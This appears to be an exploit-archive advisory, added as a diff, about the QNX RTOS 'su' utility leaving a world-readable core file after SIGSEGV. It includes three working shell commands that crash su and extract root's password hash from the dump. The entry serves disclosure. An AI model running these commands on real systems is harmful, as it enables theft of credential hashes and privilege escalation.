@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/4914/info
+
+It has been reported that the 'su' utility for QNX RTOS accepts the SIGSEGV signal and dumps a world readable core file. An attacker is able to analyze the core file and obtain very sensitive information.
+
+It is very probable that this is a kernel-based vulnerability affecting not only 'su', but other setuid programs as well 
+
+$su > /dev/null &
+$kill -SEGV `ps -A | grep su | awk {'print $1'}`
+$strings /var/dumps/su.core | grep ":0:0" > /tmp/mypasswd
+
+The attacker has effectively obtained a copy of the root user's password hash. 
